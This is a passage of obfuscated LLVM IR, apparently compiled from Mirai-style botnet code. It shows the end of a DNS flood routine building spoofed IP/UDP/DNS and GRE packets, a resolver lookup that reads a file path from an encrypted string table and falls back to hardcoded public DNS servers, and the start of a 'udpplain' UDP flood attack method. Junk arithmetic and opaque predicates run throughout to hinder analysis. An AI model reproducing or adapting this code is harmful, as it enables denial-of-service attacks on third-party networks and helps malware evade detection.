  %587 = icmp eq i32 %586, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %192
  %588 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 6
  store i8 17, i8* %589, align 1
  %590 = load i32, i32* @LOCAL_ADDR, align 4
  %591 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %592 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %591, i32 0, i32 8
  store i32 %590, i32* %592, align 4
  %593 = load i32, i32* %30, align 4
  %594 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 9
  store i32 %593, i32* %595, align 4
  %596 = load i16, i16* %24, align 2
  %597 = call zeroext i16 @htons(i16 zeroext %596) #7
  %598 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %599 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %598, i32 0, i32 0
  store i16 %597, i16* %599, align 2
  %600 = load i16, i16* %25, align 2
  %601 = call zeroext i16 @htons(i16 zeroext %600) #7
  %602 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %603 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %602, i32 0, i32 1
  store i16 %601, i16* %603, align 2
  %604 = load i8, i8* %27, align 1
  %605 = zext i8 %604 to i64
  %_ = sub i64 21, %605
  %gen = mul i64 %_, %605
  %_7 = sub i64 21, %605
  %gen8 = mul i64 %_7, %605
  %_9 = sub i64 0, 21
  %gen10 = add i64 %_9, %605
  %_11 = sub i64 0, 21
  %gen12 = add i64 %_11, %605
  %_13 = sub i64 21, %605
  %gen14 = mul i64 %_13, %605
  %_15 = sub i64 0, 21
  %gen16 = add i64 %_15, %605
  %_17 = shl i64 21, %605
  %606 = add i64 21, %605
  %_18 = shl i64 %606, 2
  %_19 = sub i64 %606, 2
  %gen20 = mul i64 %_19, 2
  %_21 = sub i64 0, %606
  %gen22 = add i64 %_21, 2
  %_23 = sub i64 %606, 2
  %gen24 = mul i64 %_23, 2
  %607 = add i64 %606, 2
  %608 = load i32, i32* %29, align 4
  %609 = sext i32 %608 to i64
  %_25 = sub i64 0, %607
  %gen26 = add i64 %_25, %609
  %_27 = shl i64 %607, %609
  %_28 = sub i64 %607, %609
  %gen29 = mul i64 %_28, %609
  %_30 = sub i64 %607, %609
  %gen31 = mul i64 %_30, %609
  %_32 = shl i64 %607, %609
  %_33 = sub i64 %607, %609
  %gen34 = mul i64 %_33, %609
  %_35 = sub i64 %607, %609
  %gen36 = mul i64 %_35, %609
  %610 = add i64 %607, %609
  %_37 = shl i64 %610, 4
  %_38 = sub i64 0, %610
  %gen39 = add i64 %_38, 4
  %_40 = shl i64 %610, 4
  %_41 = shl i64 %610, 4
  %_42 = sub i64 0, %610
  %gen43 = add i64 %_42, 4
  %_44 = sub i64 0, %610
  %gen45 = add i64 %_44, 4
  %_46 = sub i64 0, %610
  %gen47 = add i64 %_46, 4
  %611 = add i64 %610, 4
  %612 = trunc i64 %611 to i16
  %613 = call zeroext i16 @htons(i16 zeroext %612) #7
  %614 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %615 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %614, i32 0, i32 2
  store i16 %613, i16* %615, align 2
  %616 = load i16, i16* %26, align 2
  %617 = call zeroext i16 @htons(i16 zeroext %616) #7
  %618 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %619 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %618, i32 0, i32 0
  store i16 %617, i16* %619, align 2
  %620 = call zeroext i16 @htons(i16 zeroext 256) #7
  %621 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %622 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %621, i32 0, i32 1
  store i16 %620, i16* %622, align 2
  %623 = call zeroext i16 @htons(i16 zeroext 1) #7
  %624 = load %struct.dnshdr*, %struct.dnshdr** %36, align 8
  %625 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %624, i32 0, i32 2
  store i16 %623, i16* %625, align 2
  %626 = load i8, i8* %27, align 1
  %627 = load i8*, i8** %37, align 8
  %628 = getelementptr inbounds i8, i8* %627, i32 1
  store i8* %628, i8** %37, align 8
  store i8 %626, i8* %627, align 1
  %629 = load i8, i8* %27, align 1
  %630 = zext i8 %629 to i32
  %631 = load i8*, i8** %37, align 8
  %632 = sext i32 %630 to i64
  %633 = getelementptr inbounds i8, i8* %631, i64 %632
  store i8* %633, i8** %37, align 8
  %634 = load i8*, i8** %37, align 8
  store i8* %634, i8** %38, align 8
  %635 = load i8*, i8** %37, align 8
  %636 = getelementptr inbounds i8, i8* %635, i64 1
  %637 = load i8*, i8** %28, align 8
  %638 = load i32, i32* %29, align 4
  %_48 = sub i32 %638, 1
  %gen49 = mul i32 %_48, 1
  %_50 = shl i32 %638, 1
  %_51 = shl i32 %638, 1
  %_52 = shl i32 %638, 1
  %_53 = shl i32 %638, 1
  %_54 = sub i32 0, %638
  %gen55 = add i32 %_54, 1
  %639 = add nsw i32 %638, 1
  call void @util_memcpy(i8* %636, i8* %637, i32 %639)
  store i32 0, i32* %31, align 4
  br label %originalBB6

originalBB59alteredBB:                            ; preds = %originalBB59, %261
  %640 = load i32, i32* %31, align 4
  %641 = load i32, i32* %29, align 4
  %642 = icmp slt i32 %640, %641
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %306
  %643 = load i8, i8* %32, align 1
  %644 = load i8*, i8** %38, align 8
  store i8 %643, i8* %644, align 1
  %645 = load i8*, i8** %37, align 8
  %646 = load i32, i32* %29, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds i8, i8* %645, i64 %647
  %649 = getelementptr inbounds i8, i8* %648, i64 2
  %650 = bitcast i8* %649 to %struct.grehdr*
  store %struct.grehdr* %650, %struct.grehdr** %39, align 8
  %651 = call zeroext i16 @htons(i16 zeroext 1) #7
  %652 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %653 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %652, i32 0, i32 0
  store i16 %651, i16* %653, align 2
  %654 = call zeroext i16 @htons(i16 zeroext 1) #7
  %655 = load %struct.grehdr*, %struct.grehdr** %39, align 8
  %656 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %655, i32 0, i32 1
  store i16 %654, i16* %656, align 2
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %337
  %657 = load i32, i32* %17, align 4
  %_68 = sub i32 %657, 1
  %gen69 = mul i32 %_68, 1
  %_70 = shl i32 %657, 1
  %658 = add nsw i32 %657, 1
  store i32 %658, i32* %17, align 4
  br label %originalBB67

originalBB74alteredBB:                            ; preds = %originalBB74, %400
  %659 = load i16, i16* %25, align 2
  %660 = zext i16 %659 to i32
  %661 = icmp eq i32 %660, 65535
  br label %originalBB74
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca [2048 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca [32 x i8], align 16
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %19 = call i8* @table_retrieve_val(i32 21, i32* null)
  %20 = call i32 (i8*, i32, ...) @open(i8* %19, i32 0)
  store i32 %20, i32* %10, align 4
  call void @table_lock_val(i8 zeroext 21)
  %21 = load i32, i32* %10, align 4
  %22 = icmp sge i32 %21, 0
  %23 = load i32, i32* @x.39
  %24 = load i32, i32* @y.40
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %22, label %31, label %239

; <label>:31:                                     ; preds = %originalBBpart2
  %32 = load i32, i32* %10, align 4
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %34 = call i64 @read(i32 %32, i8* %33, i64 2048)
  %35 = trunc i64 %34 to i32
  store i32 %35, i32* %11, align 4
  %36 = load i32, i32* %10, align 4
  %37 = call i32 @close(i32 %36)
  call void @table_unlock_val(i8 zeroext 22)
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %39 = load i32, i32* %11, align 4
  %40 = call i8* @table_retrieve_val(i32 22, i32* null)
  %41 = call i32 @util_stristr(i8* %38, i32 %39, i8* %40)
  store i32 %41, i32* %12, align 4
  call void @table_lock_val(i8 zeroext 22)
  %42 = load i32, i32* %12, align 4
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %222

; <label>:44:                                     ; preds = %31
  store i8 0, i8* %16, align 1
  store i8 0, i8* %17, align 1
  %45 = load i32, i32* %12, align 4
  store i32 %45, i32* %14, align 4
  br label %46

; <label>:46:                                     ; preds = %originalBBpart229, %44
  %47 = load i32, i32* %14, align 4
  %48 = load i32, i32* %11, align 4
  %49 = icmp slt i32 %47, %48
  br i1 %49, label %50, label %199

; <label>:50:                                     ; preds = %46
  %51 = load i32, i32* %14, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 %52
  %54 = load i8, i8* %53, align 1
  store i8 %54, i8* %18, align 1
  %55 = load i8, i8* %16, align 1
  %56 = icmp ne i8 %55, 0
  br i1 %56, label %84, label %57

; <label>:57:                                     ; preds = %50
  %58 = load i8, i8* %18, align 1
  %59 = sext i8 %58 to i32
  %60 = icmp eq i32 %59, 32
  br i1 %60, label %65, label %61

; <label>:61:                                     ; preds = %57
  %62 = load i8, i8* %18, align 1
  %63 = sext i8 %62 to i32
  %64 = icmp eq i32 %63, 9
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %61, %57
  br label %180

; <label>:66:                                     ; preds = %61
  %67 = load i32, i32* @x.39
  %68 = load i32, i32* @y.40
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %66
  store i8 1, i8* %16, align 1
  %75 = load i32, i32* @x.39
  %76 = load i32, i32* @y.40
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %83

; <label>:83:                                     ; preds = %originalBBpart24
  br label %84

; <label>:84:                                     ; preds = %83, %50
  %85 = load i8, i8* %18, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp ne i32 %86, 46
  br i1 %87, label %88, label %128

; <label>:88:                                     ; preds = %84
  %89 = load i32, i32* @x.39
  %90 = load i32, i32* @y.40
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %88
  %97 = load i8, i8* %18, align 1
  %98 = sext i8 %97 to i32
  %99 = icmp slt i32 %98, 48
  %100 = load i32, i32* @x.39
  %101 = load i32, i32* @y.40
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %99, label %149, label %108

; <label>:108:                                    ; preds = %originalBBpart28
  %109 = load i32, i32* @x.39
  %110 = load i32, i32* @y.40
  %111 = sub i32 %109, 1
  %112 = mul i32 %109, %111
  %113 = urem i32 %112, 2
  %114 = icmp eq i32 %113, 0
  %115 = icmp slt i32 %110, 10
  %116 = or i1 %114, %115
  br i1 %116, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %108
  %117 = load i8, i8* %18, align 1
  %118 = sext i8 %117 to i32
  %119 = icmp sgt i32 %118, 57
  %120 = load i32, i32* @x.39
  %121 = load i32, i32* @y.40
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %119, label %149, label %128

; <label>:128:                                    ; preds = %originalBBpart212, %84
  %129 = load i32, i32* @x.39
  %130 = load i32, i32* @y.40
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %128
  %137 = load i32, i32* %14, align 4
  %138 = load i32, i32* %11, align 4
  %139 = sub nsw i32 %138, 1
  %140 = icmp eq i32 %137, %139
  %141 = load i32, i32* @x.39
  %142 = load i32, i32* @y.40
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart221, label %originalBB14alteredBB

originalBBpart221:                                ; preds = %originalBB14
  br i1 %140, label %149, label %163

; <label>:149:                                    ; preds = %originalBBpart221, %originalBBpart212, %originalBBpart28
  %150 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %151 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %152 = load i32, i32* %12, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %151, i64 %153
  %155 = load i32, i32* %14, align 4
  %156 = load i32, i32* %12, align 4
  %157 = sub nsw i32 %155, %156
  call void @util_memcpy(i8* %150, i8* %154, i32 %157)
  %158 = load i32, i32* %14, align 4
  %159 = load i32, i32* %12, align 4
  %160 = sub nsw i32 %158, %159
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i64 0, i64 %161
  store i8 0, i8* %162, align 1
  store i8 1, i8* %17, align 1
  br label %199

; <label>:163:                                    ; preds = %originalBBpart221
  %164 = load i32, i32* @x.39
  %165 = load i32, i32* @y.40
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %163
  %172 = load i32, i32* @x.39
  %173 = load i32, i32* @y.40
  %174 = sub i32 %172, 1
  %175 = mul i32 %172, %174
  %176 = urem i32 %175, 2
  %177 = icmp eq i32 %176, 0
  %178 = icmp slt i32 %173, 10
  %179 = or i1 %177, %178
  br i1 %179, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %180

; <label>:180:                                    ; preds = %originalBBpart225, %65
  %181 = load i32, i32* @x.39
  %182 = load i32, i32* @y.40
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %180
  %189 = load i32, i32* %14, align 4
  %190 = add nsw i32 %189, 1
  store i32 %190, i32* %14, align 4
  %191 = load i32, i32* @x.39
  %192 = load i32, i32* @y.40
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %46

; <label>:199:                                    ; preds = %149, %46
  %200 = load i8, i8* %17, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %221

; <label>:202:                                    ; preds = %199
  %203 = load i32, i32* @x.39
  %204 = load i32, i32* @y.40
  %205 = sub i32 %203, 1
  %206 = mul i32 %203, %205
  %207 = urem i32 %206, 2
  %208 = icmp eq i32 %207, 0
  %209 = icmp slt i32 %204, 10
  %210 = or i1 %208, %209
  br i1 %210, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %202
  %211 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %212 = call i32 @inet_addr(i8* %211) #6
  store i32 %212, i32* %9, align 4
  %213 = load i32, i32* @x.39
  %214 = load i32, i32* @y.40
  %215 = sub i32 %213, 1
  %216 = mul i32 %213, %215
  %217 = urem i32 %216, 2
  %218 = icmp eq i32 %217, 0
  %219 = icmp slt i32 %214, 10
  %220 = or i1 %218, %219
  br i1 %220, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br label %298

; <label>:221:                                    ; preds = %199
  br label %222

; <label>:222:                                    ; preds = %221, %31
  %223 = load i32, i32* @x.39
  %224 = load i32, i32* @y.40
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %222
  %231 = load i32, i32* @x.39
  %232 = load i32, i32* @y.40
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %239

; <label>:239:                                    ; preds = %originalBBpart237, %originalBBpart2
  %240 = load i32, i32* @x.39
  %241 = load i32, i32* @y.40
  %242 = sub i32 %240, 1
  %243 = mul i32 %240, %242
  %244 = urem i32 %243, 2
  %245 = icmp eq i32 %244, 0
  %246 = icmp slt i32 %241, 10
  %247 = or i1 %245, %246
  br i1 %247, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %239
  %248 = call i32 @rand_next()
  %249 = urem i32 %248, 4
  %250 = load i32, i32* @x.39
  %251 = load i32, i32* @y.40
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBBpart252, label %originalBB39alteredBB

originalBBpart252:                                ; preds = %originalBB39
  switch i32 %249, label %298 [
    i32 0, label %258
    i32 1, label %260
    i32 2, label %278
    i32 3, label %296
  ]

; <label>:258:                                    ; preds = %originalBBpart252
  %259 = call i32 @htonl(i32 134744072) #7
  store i32 %259, i32* %9, align 4
  br label %298

; <label>:260:                                    ; preds = %originalBBpart252
  %261 = load i32, i32* @x.39
  %262 = load i32, i32* @y.40
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %260
  %269 = call i32 @htonl(i32 1246898730) #7
  store i32 %269, i32* %9, align 4
  %270 = load i32, i32* @x.39
  %271 = load i32, i32* @y.40
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %298

; <label>:278:                                    ; preds = %originalBBpart252
  %279 = load i32, i32* @x.39
  %280 = load i32, i32* @y.40
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %278
  %287 = call i32 @htonl(i32 1074151430) #7
  store i32 %287, i32* %9, align 4
  %288 = load i32, i32* @x.39
  %289 = load i32, i32* @y.40
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br label %298

; <label>:296:                                    ; preds = %originalBBpart252
  %297 = call i32 @htonl(i32 67240450) #7
  store i32 %297, i32* %9, align 4
  br label %298

; <label>:298:                                    ; preds = %296, %originalBBpart260, %originalBBpart256, %258, %originalBBpart252, %originalBBpart233
  %299 = load i32, i32* %9, align 4
  ret i32 %299

originalBBalteredBB:                              ; preds = %originalBB, %0
  %300 = alloca i32, align 4
  %301 = alloca i32, align 4
  %302 = alloca i32, align 4
  %303 = alloca i32, align 4
  %304 = alloca [2048 x i8], align 16
  %305 = alloca i32, align 4
  %306 = alloca [32 x i8], align 16
  %307 = alloca i8, align 1
  %308 = alloca i8, align 1
  %309 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 21)
  %310 = call i8* @table_retrieve_val(i32 21, i32* null)
  %311 = call i32 (i8*, i32, ...) @open(i8* %310, i32 0)
  store i32 %311, i32* %301, align 4
  call void @table_lock_val(i8 zeroext 21)
  %312 = load i32, i32* %301, align 4
  %313 = icmp sge i32 %312, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %66
  store i8 1, i8* %16, align 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %314 = load i8, i8* %18, align 1
  %315 = sext i8 %314 to i32
  %316 = icmp slt i32 %315, 48
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %108
  %317 = load i8, i8* %18, align 1
  %318 = sext i8 %317 to i32
  %319 = icmp sgt i32 %318, 57
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %128
  %320 = load i32, i32* %14, align 4
  %321 = load i32, i32* %11, align 4
  %_ = shl i32 %321, 1
  %_15 = sub i32 %321, 1
  %gen = mul i32 %_15, 1
  %_16 = shl i32 %321, 1
  %_17 = shl i32 %321, 1
  %_18 = sub i32 %321, 1
  %gen19 = mul i32 %_18, 1
  %322 = sub nsw i32 %321, 1
  %323 = icmp eq i32 %320, %322
  br label %originalBB14

originalBB23alteredBB:                            ; preds = %originalBB23, %163
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %180
  %324 = load i32, i32* %14, align 4
  %325 = add nsw i32 %324, 1
  store i32 %325, i32* %14, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %202
  %326 = getelementptr inbounds [32 x i8], [32 x i8]* %15, i32 0, i32 0
  %327 = call i32 @inet_addr(i8* %326) #6
  store i32 %327, i32* %9, align 4
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %222
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %239
  %328 = call i32 @rand_next()
  %_40 = sub i32 0, %328
  %gen41 = add i32 %_40, 4
  %_42 = sub i32 %328, 4
  %gen43 = mul i32 %_42, 4
  %_44 = sub i32 %328, 4
  %gen45 = mul i32 %_44, 4
  %_46 = sub i32 %328, 4
  %gen47 = mul i32 %_46, 4
  %_48 = shl i32 %328, 4
  %_49 = sub i32 0, %328
  %gen50 = add i32 %_49, 4
  %329 = urem i32 %328, 4
  br label %originalBB39

originalBB54alteredBB:                            ; preds = %originalBB54, %260
  %330 = call i32 @htonl(i32 1246898730) #7
  store i32 %330, i32* %9, align 4
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %278
  %331 = call i32 @htonl(i32 1074151430) #7
  store i32 %331, i32* %9, align 4
  br label %originalBB58
}

declare i32 @open(i8*, i32, ...) #4

declare i64 @read(i32, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.41
  %6 = load i32, i32* @y.42
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i8**, align 8
  %19 = alloca i32*, align 8
  %20 = alloca i16, align 2
  %21 = alloca i16, align 2
  %22 = alloca i16, align 2
  %23 = alloca i8, align 1
  %24 = alloca %struct.sockaddr_in, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %30 = alloca i8*, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %31 = load i8, i8* %13, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %18, align 8
  %35 = load i8, i8* %13, align 1
  %36 = zext i8 %35 to i64
  %37 = call noalias i8* @calloc(i64 %36, i64 4) #6
  %38 = bitcast i8* %37 to i32*
  store i32* %38, i32** %19, align 8
  %39 = load i8, i8* %15, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 7, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %20, align 2
  %43 = load i8, i8* %15, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 6, i32 65535)
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* %21, align 2
  %47 = load i8, i8* %15, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 0, i32 512)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %22, align 2
  %51 = load i8, i8* %15, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 1, i32 1)
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %23, align 1
  %55 = bitcast %struct.sockaddr_in* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 16, i32 4, i1 false)
  %56 = load i16, i16* %21, align 2
  %57 = zext i16 %56 to i32
  %58 = icmp eq i32 %57, 65535
  %59 = load i32, i32* @x.41
  %60 = load i32, i32* @y.42
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %58, label %67, label %70

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = call i32 @rand_next()
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %21, align 2
  br label %73

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i16, i16* %21, align 2
  %72 = call zeroext i16 @htons(i16 zeroext %71) #7
  store i16 %72, i16* %21, align 2
  br label %73

; <label>:73:                                     ; preds = %70, %67
  %74 = load i32, i32* @x.41
  %75 = load i32, i32* @y.42
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
